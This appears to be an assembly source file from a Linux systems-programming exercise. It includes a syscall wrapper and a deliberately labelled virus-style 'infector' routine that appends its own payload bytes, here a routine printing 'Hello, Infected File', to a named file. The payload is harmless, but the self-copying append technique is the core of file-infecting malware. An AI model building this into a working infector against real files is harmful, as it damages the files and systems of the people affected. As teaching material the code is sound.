section .text               ; Defines the executable code section
    global _start           ; Entry point for the linker
    global system_call      ; Makes system_call accessible to other files (C/other ASM)
    global infection        ; Label for the infection routine
    global infector         ; Label for the file appending routine
    global code_start       ; Marks the beginning of the payload to be copied
    global code_end         ; Marks the end of the payload to be copied
    extern main             ; Declares the C 'main' function as an external symbol

_start:
    pop    eax              ; Pop the number of arguments (argc) from the stack into EAX
    mov    ecx, esp         ; Move the pointer to arguments (argv) into ECX
    push   ecx              ; Push argv onto the stack (C calling convention)
    push   eax              ; Push argc onto the stack (C calling convention)
    call   main             ; Call the external C main function
    mov    ebx, eax         ; Move the return value of main into EBX (exit code)
    mov    eax, 1           ; Load sys_exit syscall number (1) into EAX
    int    0x80             ; Trigger software interrupt to exit the program

system_call:
    push    ebp             ; Save the current base pointer
    mov     ebp, esp        ; Set the base pointer to the current stack pointer
    pushad                  ; Save all general-purpose registers (EAX, ECX, EDX, EBX, ESP, EBP, ESI, EDI)
    mov     eax, [ebp+8]    ; Move the first C argument (syscall number) into EAX
    mov     ebx, [ebp+12]   ; Move the second C argument (arg 1) into EBX
    mov     ecx, [ebp+16]   ; Move the third C argument (arg 2) into ECX
    mov     edx, [ebp+20]   ; Move the fourth C argument (arg 3) into EDX
    int     0x80            ; Invoke the Linux kernel system call
    
    ; The stack pointer (esp) currently points to the registers saved by pushad.
    ; eax is stored at [esp + 28]. We overwrite it with the result of the syscall.
    mov     [esp + 28], eax ; Store the syscall result into the saved EAX slot on the stack
    popad                   ; Restore all registers; EAX now contains the syscall result
    pop     ebp             ; Restore the old base pointer
    ret                     ; Return to the calling function

code_start:                 ; Marker for the start of the "malicious" payload
infection:
    pushad                  ; Save all registers to avoid corrupting the host state
    mov eax, 4              ; Load sys_write syscall number (4) into EAX
    mov ebx, 1              ; Load file descriptor for stdout (1) into EBX
    mov ecx, inf_msg        ; Load the address of the infection message into ECX
    mov edx, 21             ; Load the length of the message (21 bytes) into EDX
    int 0x80                ; Invoke the system call to print the message
    popad                   ; Restore all registers to original state
    ret                     ; Return to caller

inf_msg: db "Hello, Infected File", 10 ; Define the string constant with a newline (10)

infector:
    push    ebp             ; Establish stack frame
    mov     ebp, esp
    pushad                  ; Save registers (32 bytes)

    ; Arguments in cdecl: [ebp+8] is the first argument
    mov     ebx, [ebp+8]    ; EBX = char *filename
    
    ; 1. Open the file
    mov     eax, 5          ; sys_open
    ; O_WRONLY (1) | O_APPEND (1024) = 1025
    mov     ecx, 1025       
    mov     edx, 0644Q      ; Permissions
    int     0x80            
    
    cmp     eax, 0          ; Check for error (EAX < 0)
    jl      .error          

    ; 2. Write the payload
    mov     ebx, eax        ; EBX = File Descriptor
    mov     eax, 4          ; sys_write
    mov     ecx, code_start ; Start address of payload
    mov     edx, code_end   
    sub     edx, ecx        ; Length = code_end - code_start
    int     0x80            

    ; 3. Close the file
    mov     eax, 6          ; sys_close
    int     0x80            

.error:
    popad                   ; Restore registers
    pop     ebp
    ret
    
code_end:                   ; Marker for the end of the payload code